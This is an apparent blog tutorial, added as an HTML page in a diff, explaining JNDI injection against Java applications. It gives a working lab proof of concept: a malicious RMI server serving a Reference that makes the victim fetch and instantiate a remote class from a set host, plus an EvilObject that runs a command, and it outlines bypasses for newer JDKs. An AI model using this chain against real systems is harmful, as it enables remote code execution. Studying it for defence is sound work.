@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>JNDI注入原理浅析 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "JNDI \u7b80\u4ecb", url: "#jndi_1" },
+              {title: "JNDI\u6ce8\u5165", url: "#jndi_2" },
+              {title: "JNDI\u6ce8\u5165\uff1a\u9ad8\u7248\u672c\u5982\u4f55\u5229\u7528\uff1f", url: "#jndi_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../RMI%20ATTACK/RMI%20ATTACK/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../RMI%20ATTACK/RMI%20ATTACK/" class="btn btn-xs btn-link">
+        RMI ATTACK
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        CommonsBeanUtils 反序列化
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="jndi">JNDI注入原理浅析</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#JNDI-简介">JNDI 简介</a></li>
+<li><a href="#JNDI注入">JNDI注入</a><ul>
+<li><a href="#RMI工作原理">RMI工作原理</a></li>
+<li><a href="#Reference类">Reference类</a></li>
+<li><a href="#JNDI-协议转换">JNDI 协议转换</a></li>
+<li><a href="#JNDI注入">JNDI注入</a></li>
+<li><a href="#JNDI注入分析">JNDI注入分析</a></li>
+</ul>
+</li>
+<li><a href="#JNDI注入高版本如何利用">JNDI注入：高版本如何利用？</a><ul>
+<li><a href="#TrustURLCodeBase">TrustURLCodeBase</a></li>
+<li><a href="#概览">概览</a></li>
+<li><a href="#利用本地类">利用本地类</a><ul>
+<li><a href="#TOMCAT8">TOMCAT8</a></li>
+<li><a href="#Groovy">Groovy</a></li>
+</ul>
+</li>
+<li><a href="#ldap反序列化">ldap反序列化</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<hr />
+<p>JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI</p>
+<h2 id="jndi_1">JNDI 简介</h2>
+<p>JNDI (Java Naming and Directory Interface) 是一个java中的技术，用于提供一个访问各种资源的接口。比如通过JNDI可以在局域网上定位一台打印机，或者定位数据库服务，远程JAVA对象等。</p>
+<p>JNDI底层支持RMI远程对象，RMI注册的服务可以直接被JNDI接口访问调用。</p>
+<h2 id="jndi_2">JNDI注入</h2>
+<h3 id="rmi">RMI工作原理</h3>
+<p>首先我们先思考一下RMI的工作原理是什么。</p>
+<pre><code>1.服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上
+2.客户端请求RMI服务器上的类
+3.服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用
+4.客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法
+5.服务器执行完后将结果返回给客户端
+</code></pre>
+<p>所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的。</p>
+<h3 id="reference">Reference类</h3>
+<p>首先来看一下如何创建一个对象Reference并将其绑定到RMI服务器上</p>
+<pre><code>......定义好了registry，它是一个Registry对象（RMI中用于将类注册到服务器上的对象）
+Reference refObj = new Reference("refClassName", "insClassName", "http://a.com:12345");
+ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
+registry.bind("refObj", refObjWrapper);
+</code></pre>
+<p>前面说到RMI服务器会向客户端返回stub或者说一个对象，如果RMI服务器传回客户端一个Reference对象呢？那就要说道说道了。</p>
+<p>对于RMI服务器而言，向客户端传回一个Reference对象和传回其他对象一样，并没有多大区别。</p>
+<p>但是客户端由于获取到了一个Reference实例，比如说就是上面代码中的Reference实例，接下来客户端就会先在CLASSPATH里寻找被标识为refClassName的类。如果没找到，它就会去请求http\://a.com:12345/refClassName.class 对里面的类进行动态加载，并调用insClassName类的构造方法。注意，调用insClassName类的构造方法这个行为是由客户端完成的。</p>
+<p>上面的一系列行为可以概括为xiatu</p>
+<p><img alt="image-20210324014723682" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324014723682.png" title="image-20210324014723682" /></p>
+<h3 id="jndi_3">JNDI 协议转换</h3>
+<p>我们在通过JNDI调用远程对象时，需要设置环境，就像这样</p>
+<pre><code>Properties env = new Properties();
+env.put(Context.INITIAL_CONTEXT_FACTORY,
+        "com.sun.jndi.rmi.registry.RegistryContextFactory");  //设置了rmi请求方式
+env.put(Context.PROVIDER_URL,
+        "rmi://localhost:1099");
+Context ctx = new InitialContext(env);
+</code></pre>
+<p>比如以上代码，就设置了JNDI会通过rmi的方式去请求远程对象。</p>
+<p>但是当调用lookup()或者search()时，可以直接无视环境是如何设置请求方式的，因为JNDI有协议动态转换机制。什么意思呢？看看代码就晓得了</p>
+<pre><code>Properties env = new Properties();
+env.put(Context.INITIAL_CONTEXT_FACTORY,
+        "com.sun.jndi.rmi.registry.RegistryContextFactory");
+env.put(Context.PROVIDER_URL,
+        "rmi://localhost:1099");
+Context ctx = new InitialContext(env);
+ctx.lookup("ldap://a.com/ou=foo,dc=foobar,dc=com")
+</code></pre>
+<p>以上代码执行后，会调用ldap协议去请求，而不是rmi。</p>
+<p>这是因为lookup或者search函数在参数为绝对路径URI的情况下动态转换协议为参数中指定的协议。</p>
+<h3 id="jndi_4">JNDI注入</h3>
+<p>如果我们满足以下条件，JNDI注入就会成功</p>
+<p>JNDI调用的lookup参数可控</p>
+<p>URI可进行动态协议转换</p>
+<p>Reference对象指定类会被加载并实例化</p>
+<p>其实最重要的就是第一条。</p>
+<p>下面用一张图概括从JNDI注入到RCE的流程</p>
+<p><img alt="image-20210324141937091" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324141937091.png" title="image-20210324141937091" /></p>
+<p>1.攻击者控制了lookup参数</p>
+<p>2.攻击者将lookup参数替换为去请求恶意服务器A上的Reference对象</p>
+<p>3.恶意服务器A返回Reference对象</p>
+<p>4.受害机器获得Reference对象后先在CLASSPATH中查找Reference对象中的指定类是否存在，若不存在则请求Reference对象中指定的恶意服务器B去获得指定类</p>
+<p>5.恶意服务器B返回指定类</p>
+<p>6.受害机器得到指定类后，执行指定类的构造函数，从而达到RCE</p>
+<p>下面是代码实现</p>
+<p>受害机器</p>
+<pre><code>import java.rmi.Remote;
+import java.rmi.RemoteException;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+interface IHello extends Remote {
+    abstract String sayHello(String name) throws RemoteException;
+}
+public class CallService {
+    public static void main(String args[]) throws Exception{
+        if(args.length&lt;1){
+            System.out.println("Plz input url");
+            System.exit(-1);
+        }
+        else {
+            // JNDI 获取 RMI 上的方法对象并进行调用
+            Context ctx = new InitialContext();
+            IHello rHello = (IHello) ctx.lookup((String)args[0]);
+            System.out.println(rHello.sayHello("tom"));
+        }
+    }
+}
+</code></pre>
+<p>RMI</p>
+<pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.registry.*;
+import java.rmi.server.UnicastRemoteObject;
+
+
+public class evilrmi {
+    public static void main(String[] args) throws Exception{
+        Registry registry = LocateRegistry.createRegistry(1010);
+        Reference refObj = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http://192.168.111.1:80/&quot;);
+        ReferenceWrapper refObjWra = new ReferenceWrapper(refObj);
+        registry.bind(&quot;refObj&quot;,refObjWra);
+        System.out.println(&quot;gogo&quot;);
+    }
+}
+
+</code></pre>
+<p>EvilObject</p>
+<pre><code>import java.lang.Runtime;
+import java.lang.Process;
+
+public class EvilObject {
+    public EvilObject() throws Exception {
+        Runtime rt = Runtime.getRuntime();
+        String[] commands = {"calc"};
+        Process pc = rt.exec(commands);
+        pc.waitFor();
+    }
+}
+</code></pre>
+<p>我们先运行RMI服务器，然后把EvilObject.class放置于http\://192.168.111.1:80/下，然后指定lookup参数为我们的恶意RMI服务器去运行受害机器。</p>
+<h3 id="jndi_5">JNDI注入分析</h3>
+<p>调用栈如下</p>
+<p><img alt="image-20210701232938917" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210701232938917.png" title="image-20210701232938917" /></p>
+<p>跟进lookup方法，我们可以看到此处</p>
+<p><img alt="image-20210702171951671" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702171951671.png" title="image-20210702171951671" /></p>
+<p>再次跟进lookup方法</p>
+<p><img alt="image-20210702172010859" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172010859.png" title="image-20210702172010859" /></p>
+<p>再次跟进lookup方法</p>
+<p><img alt="image-20210702172117627" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172117627.png" title="image-20210702172117627" /></p>
+<p>跟进decodeObject</p>
+<p><img alt="image-20210702172218634" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172218634.png" title="image-20210702172218634" /></p>
+<p>跟进，来到此处。此处getObjectFactoryFromReference 是去获取Reference对象。</p>
+<p>ref和f此时分别对应的值为Reference类名和Reference指向的类的类名</p>
+<p><img alt="image-20210702172343083" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172343083.png" title="image-20210702172343083" /></p>
+<p><img alt="image-20210702172630123" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172630123.png" title="image-20210702172630123" /></p>
+<p>再度跟进</p>
+<p><img alt="image-20210702172731243" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172731243.png" title="image-20210702172731243" /></p>
+<p>1处是尝试本地加载（从CLASSPATH中）Reference指定的类，2处是如果本地无法加载且ref中classFactoryLocation属性值不为空，就从此属性指定的值远程获取加载类。最后在3处对加载到类执行实例化，从而触发构造函数。</p>
+<h2 id="jndi_6">JNDI注入：高版本如何利用？</h2>
+<h3 id="trusturlcodebase">TrustURLCodeBase</h3>
+<p>JDK 6u141, JDK 7u131, JDK 8u121 以及更高版本中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference<strong>远程</strong>加载Object Factory类的特性，所以会执行以上流程会有如下报错</p>
+<pre><code>The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
+</code></pre>
+<p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p>
+<h3 id="_2">概览</h3>
+<p>以上是JNDI Reference+RMI的利用方式，除此之外还有一个JNDI Reference+ldap 的利用方式，操作与JNDI Reference+RMI大同小异，也就是通过ldap协议lookup一个恶意服务器并获得恶意Reference对象，并且LDAP服务的Reference远程加载Factory类不受 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以利用面更广</p>
+<p>但是在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
+<p>借用一下三只师傅的图</p>
+<p><img alt="" src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg" /></p>
+<p>绕过的两种思路:</p>
+<ol>
+<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
+<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
+</ol>
+<p>看上去似乎很好理解，深入的来看看吧。</p>
+<h3 id="_3">利用本地类</h3>
+<p>上面我们讲到了jndi注入的流程，提到了**如果本地无法加载且ref中classFactoryLocation属性值不为空，就从此属性指定的值远程获取加载类 **，如果本地可以加载呢？是不是也能造成攻击？</p>
+<p><img alt="image-20210702172731243" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210702172731243.png" title="image-20210702172731243" /></p>
+<p>看1处，会先调用loadClass进行本地加载ref的指定类</p>
+<p>跟进后会来到VersionHelper12#loadClass，然后会返回ref指定的类</p>
+<p><img alt="" src="../image/image_UhN16zGZA9.png" /></p>
+<p>返回指定类后后再往上走，来到getObjectInstance，会发现调用了指定类的getObjectInstance方法——我们要需要的恶意代码触发点</p>
+<p><img alt="" src="../image/image_w567LuNiFB.png" /></p>
+<pre><code class="language-纯文本">所以我们只需要找到一个本地类，其必须实现javax.naming.spi.ObjectFactory接口,因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对Factory类的实例对象进行了类型转换
+
+并且该工厂类至少存在一个getObjectInstance()方法 （可以用于执行恶意代码的）
+</code></pre>
+<p><img alt="" src="../image/image_TKjfB3vXgg.png" /></p>
+<h4 id="tomcat8">TOMCAT8</h4>
+<p>tomcat8有一个类org.apache.naming.factory.BeanFactory，其实现了ObjectFactory接口且有getObjectInstance方法，更重要的是其getObjectInstance可以执行恶意代码。</p>
+<p>它会先获取ref对象中的resourceclass</p>
+<p><img alt="" src="../image/image_UsWvXO3khj.png" /></p>
+<h4 id="groovy">Groovy</h4>
+<h3 id="ldap">ldap反序列化</h3>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../RMI%20ATTACK/RMI%20ATTACK/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../RMI%20ATTACK/RMI%20ATTACK/" class="btn btn-xs btn-link">
+        RMI ATTACK
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        CommonsBeanUtils 反序列化
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
